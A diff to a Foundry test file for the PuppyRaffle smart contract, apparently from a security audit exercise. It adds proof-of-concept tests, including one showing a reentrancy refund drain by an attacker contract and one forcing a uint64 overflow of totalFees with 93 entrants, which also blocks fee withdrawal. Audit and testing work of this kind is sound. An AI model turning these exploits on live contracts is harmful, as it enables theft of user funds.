@@ -240,7 +240,11 @@ contract PuppyRaffleTest is Test {
         assertEq(address(feeAddress).balance, expectedPrizeAmount);
     }
 
-    function test_ReentrancyRefund() public {
+    //////////////////////
+    /// Audit        ///
+    /////////////////////
+
+    function test_RefundReentrancy() public {
         address[] memory players = new address[](4);
         players[0] = playerOne;
         players[1] = playerTwo;
@@ -269,6 +273,37 @@ contract PuppyRaffleTest is Test {
 
         assertEq(endingContractBalance, 0);
         assertEq(endingAttackerContractBalance, startingAttackerContractBalance + startingContractBalance + entranceFee);
+    }
+
+    function test_SelectWinnerOverflow() public {
+        // players needed for the uint64 overflow
+        uint256 numPlayersToOverflow = 93;
+        address[] memory players = new address[](numPlayersToOverflow);
+        for (uint256 i = 0; i < players.length; i++) {
+            players[i] = address(i + 1);
+        }
+
+        uint256 expectedFees = (players.length * entranceFee * 20) / 100;
+
+        // entering Raffle
+        hoax(playerOne, players.length * entranceFee);
+        puppyRaffle.enterRaffle{value: players.length * entranceFee}(players);
+
+        // calling selectWinner to update totalFees
+        vm.warp(block.timestamp + puppyRaffle.raffleStartTime() + puppyRaffle.raffleDuration());
+        vm.roll(block.number + 1);
+        puppyRaffle.selectWinner();
+
+        console.log("Expected fees", expectedFees);
+        console.log("Actual fees:", puppyRaffle.totalFees());
+
+        // if true -> totalFees overflowed
+        assert(puppyRaffle.totalFees() < expectedFees);
+
+        // We are also unable to withdraw fees because of the require check
+        vm.prank(puppyRaffle.feeAddress());
+        vm.expectRevert("PuppyRaffle: There are currently players active!");
+        puppyRaffle.withdrawFees();
     }
 }
 
